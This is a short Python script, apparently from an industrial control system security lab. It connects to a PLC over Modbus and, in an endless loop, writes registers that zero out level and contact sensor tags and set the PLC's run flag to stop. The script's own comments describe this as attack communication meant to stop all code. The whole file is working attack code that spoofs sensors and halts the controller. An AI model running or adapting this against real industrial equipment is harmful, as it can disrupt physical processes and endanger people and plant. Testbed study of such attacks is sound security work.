#!/usr/bin/env python

#########################################
# Imports
#########################################
# - Logging
import modbus
import logging

# - Attack communication
from modbus	import ClientModbus as Client
from modbus	import ConnectionException 

# - World environement
from world import *

#########################################
# Logging
#########################################
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Stop all code
#####################################
client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
try:
    client.connect()
    while True:
        rq = client.write(LEVEL_RO_ADDR, 1) 
        rq = client.write(LEVEL_TAG_SENSOR, 0) 
        rq = client.write(CONTACT_RO_ADDR, 0) 	
        rq = client.write(CONTACT_TAG_SENSOR, 0) 
        rq = client.write(PLC_RW_ADDR, 0) 	
        rq = client.write(PLC_TAG_RUN, 0)
except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
